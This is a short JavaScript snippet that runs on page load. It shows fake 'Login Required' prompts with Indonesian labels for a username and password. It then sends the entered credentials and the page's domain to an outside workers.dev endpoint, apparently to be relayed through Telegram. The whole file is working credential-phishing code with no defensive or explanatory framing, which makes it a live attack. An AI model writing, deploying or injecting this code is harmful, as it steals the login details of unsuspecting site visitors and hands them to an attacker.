function showAlert() {
    var username = prompt("Login Required\nNama Pengguna:");
    var password = prompt("Login Required\nSandi:");

    // Send the username, password, and document domain
    sendToWorker(username, password, document.domain);
}

function sendToWorker(username, password, domain) {
    var message = `Username: ${username}\nPassword: ${password}\nDomain: ${domain}`;
    var url = `https://telegram-worker.inggarsaput.workers.dev/?message=${encodeURIComponent(message)}`;

    // Create a new XMLHttpRequest
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.send();
}

// Call the function to show the alert
showAlert();
